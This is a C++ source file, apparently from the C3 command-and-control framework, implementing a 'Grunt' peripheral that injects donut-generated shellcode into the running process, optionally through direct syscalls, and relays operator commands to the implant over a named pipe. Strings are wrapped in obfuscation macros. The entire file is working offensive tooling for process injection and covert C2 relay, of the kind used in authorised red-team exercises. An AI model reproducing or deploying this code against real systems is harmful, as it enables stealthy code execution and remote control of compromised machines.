#include "StdAfx.h"
#include "Grunt.h"

FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
{
	//auto [pipeName, payload, connectAttempts, useSyscalls] = arguments.Read<std::string, ByteVector, uint32_t>();
	auto [pipeName, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, payload] = arguments.Read<std::string, uint16_t, uint16_t, bool, ByteView>();

	// Arguments validation.
	if (payload.empty())
		throw std::invalid_argument(OBF("There was no payload provided."));

	if (pipeName.empty() || !maxConnectionAttempts)
		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));

	// Originally we were setting up the CLR for our .NET assembly, now we're using donut'd shellcode
	// we can just inject as with a beacon
	// Store a handle to the Grunt Thread for later use
	m_Grunt = WinTools::InjectionBuffer(payload, useSyscalls);

	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give Grunt thread time to start pipe.

	// Connect to our Beacon named Pipe.
	for (uint16_t connectionTrial = 0u; connectionTrial < maxConnectionAttempts; ++connectionTrial)
	{
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("Grunt constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ delayBetweenConnectionTrials });
		}
	}

	// Throw a time-out exception.
	throw std::runtime_error{ OBF("Grunt creation failed") };
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Peripherals::Grunt::~Grunt()
{
	HANDLE threadHandle = m_Grunt.GetThreadHandle();
	// Check if thread already finished running and kill if otherwise
	if (WaitForSingleObject(threadHandle, 0) != WAIT_OBJECT_0)
		TerminateThread(threadHandle, 0);
}

void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
{
	m_SendQueue.emplace_back(data);
}

FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
{
	FSecure::ByteVector ret = {};
	if (m_Close)
	{
		return ret;
	}

	// Commands to Send
	if (!m_SendQueue.empty())
	{
		auto msg = std::move(m_SendQueue.front());
		m_SendQueue.pop_front();
		m_Pipe->WriteCov(msg);
	}

	// Read
	if (m_Pipe->PeakCov())
	{
		ret = m_Pipe->ReadCov();
	}

	return ret;
}

void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
{
	FSecure::C3::Device::Close();
	m_Close = true;
}

FSecure::ByteView FSecure::C3::Interfaces::Peripherals::Grunt::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "string",
				"name": "Pipe name",
				"min": 4,
				"randomize": true,
				"description": "Name of the pipe Grunt uses for communication."
			},
			{
				"type": "int32",
				"min": 1,
				"defaultValue" : 30,
				"name": "Delay",
				"description": "Delay"
			},
			{
				"type": "int32",
				"min": 0,
				"defaultValue" : 30,
				"name": "Jitter",
				"description": "Jitter"
			},			
			{
				"type": "int16",
				"min": 1,
				"defaultValue" : 10,
				"name": "Connection attempts",
				"description": "Number of connection tries before marking whole staging process unsuccessful."
			},
			{
				"type": "int16",
				"min": 30,
				"defaultValue" : 1000,
				"name": "Connection delay",
				"description": "Time in milliseconds to wait between unsuccessful connection attempts."
			},
			{
				"type": "boolean",
				"name": "Use Syscalls",
				"defaultValue": false,
				"description": "Enable the use of Direct Syscalls for beacon injection"
			}
		]
	},
	"commands": []
}
)";
}